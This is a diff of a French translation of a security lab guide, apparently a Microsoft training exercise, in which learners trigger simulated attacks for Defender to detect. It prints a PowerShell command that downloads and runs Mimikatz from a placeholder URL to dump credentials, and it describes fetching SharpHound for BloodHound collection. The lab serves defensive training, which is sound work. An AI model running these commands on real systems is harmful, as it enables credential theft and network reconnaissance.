@@ -14,21 +14,21 @@ Vous exécuterez les attaques *simulées* à l’aide de *PowerShell* sur *WIN1*
 
 1. Sur l’ordinateur *WIN1*, tapez **Commande** dans la barre de recherche, puis sélectionnez **Exécuter en tant qu’administrateur**.
 
-1. Copiez et collez la commande suivante dans l’**administrateur : Fenêtre d’invite de commandes**, puis appuyez sur **Entrée** pour l’exécuter.
+1. Copiez et collez la commande suivante dans la fenêtre **Administrateur : invite de commandes**, puis appuyez sur **Entrée** pour l’exécuter.
 
     ```CommandPrompt
     powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
     ```
 
-1. Vous devez voir un message indiquant que l’*accès est refusé* ainsi qu’un message contextuel de `Microsoft Defender Antivirus, Windows Security Virus and threats protection` affichant les *menaces trouvées*.
+1. Vous devez voir un message indiquant que l’*Accès est refusé* ainsi qu’un message contextuel de `Microsoft Defender Antivirus, Windows Security Virus and threats protection` affichant *Menaces trouvées*.
 
-1. Quittez l’**administrateur : Fenêtre d’invite de commandes** en tapant **quitter** et en appuyant sur **Entrée**.
+1. Quittez la fenêtre **Administrateur : invite de commandes** en tapant **quitter** et en appuyant sur **Entrée**.
 
 `Attack 2: Bloodhound - Collection`
 
 1. Sur l’ordinateur *WIN1*, entrez **PowerShell** dans la barre de recherche, sélectionnez **Windows PowerShell**, puis **Exécuter en tant qu’administrateur**.
 
-1. Copiez et collez les commandes suivantes dans l’**administrateur : Fenêtre Windows PowerShell**, puis appuyez sur **Entrée** pour l’exécuter.
+1. Copiez et collez les commandes suivantes dans la fenêtre **Administrateur : Windows PowerShell**, puis appuyez sur **Entrée** pour l’exécuter.
 
     ```PowerShell
     New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
@@ -37,9 +37,9 @@ Vous exécuterez les attaques *simulées* à l’aide de *PowerShell* sur *WIN1*
 
     >**Remarque :** Il est recommandé de copier, coller et exécuter les commandes une par une. Vous pouvez ouvrir *Bloc-notes* et copier les commandes dans un fichier temporaire pour y parvenir. La première commande crée un dossier nommé *ExternalPayloads* dans le même dossier que le dossier *Atomic Red Team*. La deuxième commande télécharge le fichier *SharpHound.ps1* à partir du référentiel GitHub *BloodHound* et l’enregistre dans le dossier *ExternalPayloads*.
 
-1. Un message contextuel s’affiche à partir de `Windows Security Virus and threats protection` affichant les *menaces trouvées*.
+1. Un message contextuel s’affiche à partir de `Windows Security Virus and threats protection` affichant *Menaces trouvées*.
 
-1. Copiez et collez la commande suivante dans l’**administrateur : Fenêtre Windows PowerShell**, puis appuyez sur **Entrée** pour l’exécuter.
+1. Copiez et collez la commande suivante dans la fenêtre **Administrateur : Windows PowerShell**, puis appuyez sur **Entrée** pour l’exécuter.
 
     ```PowerShell
     Test-Path "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
